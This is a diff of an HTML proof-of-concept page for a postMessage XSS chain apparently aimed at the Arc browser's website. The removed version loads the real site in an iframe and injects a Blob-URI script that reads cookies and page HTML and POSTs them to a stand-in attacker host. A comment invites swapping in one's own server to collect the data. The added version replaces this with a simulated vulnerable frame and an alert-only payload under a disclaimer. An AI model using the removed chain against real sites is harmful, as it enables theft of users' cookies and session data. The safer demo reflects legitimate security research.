@@ -1,66 +1,93 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>☠️ Ultimate XSS Chain PoC</title>
   <meta charset="utf-8">
+  <title>🔥 WebView XSS PoC</title>
   <style>
-    body { font-family: sans-serif; background: #111; color: #eee; padding: 30px; }
-    iframe { border: 2px solid #444; width: 100%; height: 500px; margin-top: 20px; }
+    body {
+      background: #f5f5f5;
+      color: #333;
+      font-family: Consolas, monospace;
+      padding: 1rem;
+      max-width: 800px;
+      margin: 0 auto;
+    }
+    .disclaimer {
+      background: #fff8e1;
+      border-left: 4px solid #ffc107;
+      padding: 1rem;
+      margin-bottom: 1rem;
+    }
+    iframe {
+      width: 100%;
+      height: 300px;
+      border: 1px solid #ccc;
+      margin-top: 1rem;
+    }
+    button {
+      background: #e53935;
+      color: white;
+      font-weight: bold;
+      padding: 0.5rem 1rem;
+      border: none;
+      cursor: pointer;
+      border-radius: 4px;
+    }
+    #log {
+      background: #fff;
+      border: 1px solid #ccc;
+      padding: 1rem;
+      margin-top: 1rem;
+      white-space: pre-wrap;
+      font-size: 0.9rem;
+    }
   </style>
 </head>
 <body>
-  <h1>🔥 Ultimate DOM XSS Chain via postMessage + Blob + Auto-Interaction</h1>
-  <p>Sending malicious payload with DOM access + CSP bypass + interaction spoofing...</p>
 
-  <iframe id="target" src="https://thebrowser.company/" sandbox="allow-scripts allow-same-origin allow-forms"></iframe>
+<div class="disclaimer">
+  <h3>⚠️ Security Demonstration</h3>
+  <p>This is a simulated vulnerable WebView. It demonstrates what happens when untrusted HTML is injected directly into the DOM.</p>
+</div>
 
-  <script>
-    const attackerServer = "https://evil.example.com/log"; // ← غيّره إلى سيرفرك إذا أردت استقبال البيانات
+<h2>🔥 Arc WebView XSS PoC</h2>
+<p>Click the button below to send a <strong>malicious payload</strong> to the simulated WebView:</p>
+<button onclick="sendXSS()">💥 Send XSS Payload</button>
 
-    // 1️⃣: كود يتم تحميله من Blob URI
-    const scriptContent = `
-      // Simulate user action
-      document.body.click?.();
-      document.body.focus?.();
-
-      // Try to leak DOM + cookies
-      const data = {
-        cookie: document.cookie,
-        html: document.documentElement.outerHTML.slice(0, 1000)
-      };
-
-      fetch('${attackerServer}', {
-        method: 'POST',
-        mode: 'no-cors',
-        body: JSON.stringify(data)
+<iframe id="webview" srcdoc="
+  <!DOCTYPE html>
+  <html>
+  <body style='font-family: Arial; padding: 1rem; background: #fffbe6;'>
+    <h3>🧪 Vulnerable WebView</h3>
+    <div id='output'>[waiting for message]</div>
+    <script>
+      window.addEventListener('message', (e) => {
+        const output = document.getElementById('output');
+        if (e.data?.dangerousHTML) {
+          output.innerHTML = e.data.dangerousHTML;
+        } else {
+          output.textContent = '[Invalid or safe message]';
+        }
       });
+    </script>
+  </body>
+  </html>
+"></iframe>
 
-      alert('🔥 XSS via Blob URI + Auto interaction + DOM exfiltration');
-    `;
+<div id="log">[log will appear here]</div>
 
-    // 2️⃣: إنشاء Blob URI لتجاوز CSP
-    const blob = new Blob([scriptContent], { type: "text/javascript" });
-    const blobUrl = URL.createObjectURL(blob);
+<script>
+function sendXSS() {
+  const payload = {
+    dangerousHTML: `<script>alert('🔥 XSS confirmed')</script>`
+  };
+  const frame = document.getElementById('webview');
+  frame.contentWindow.postMessage(payload, '*');
+  document.getElementById('log').textContent =
+    '📤 XSS Payload sent:\n' +
+    JSON.stringify(payload, null, 2);
+}
+</script>
 
-    // 3️⃣: إعداد الرسالة
-    const payload = {
-      message: "OB_SHOULD_SHOW_PICKER",
-      content: {
-        marketerId: [
-          `<script src="${blobUrl}"></script>`
-        ]
-      }
-    };
-
-    // 4️⃣: إرسال postMessage بعد تحميل iframe
-    const iframe = document.getElementById("target");
-    iframe.onload = () => {
-      console.log("✅ iframe loaded");
-      setTimeout(() => {
-        console.log("🚀 Sending advanced XSS payload...");
-        iframe.contentWindow.postMessage(payload, "*");
-      }, 1000);
-    };
-  </script>
 </body>
 </html>
